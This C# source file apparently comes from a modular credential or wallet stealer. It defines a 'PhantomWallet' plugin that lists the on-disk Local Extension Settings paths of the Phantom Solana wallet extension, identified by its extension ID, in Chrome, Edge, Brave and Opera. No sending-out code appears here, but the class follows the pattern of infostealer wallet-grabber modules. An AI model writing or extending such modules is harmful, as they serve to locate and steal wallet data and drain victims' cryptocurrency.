using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    // Phantom Wallet - Popular Solana wallet (2025)
    public class PhantomWallet : CryptoWalletBase
    {
        public PhantomWallet()
        {
            walletName = "Phantom";
            
            // Phantom browser extension paths
            // Extension ID: bfnaelmomeimhlpmgjnjophhpkkoljpa
            walletPaths.Add("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa");
            walletPaths.Add("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa");
            walletPaths.Add("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa");
            walletPaths.Add("%APPDATA%\\Opera Software\\Opera Stable\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa");
        }
    }
}
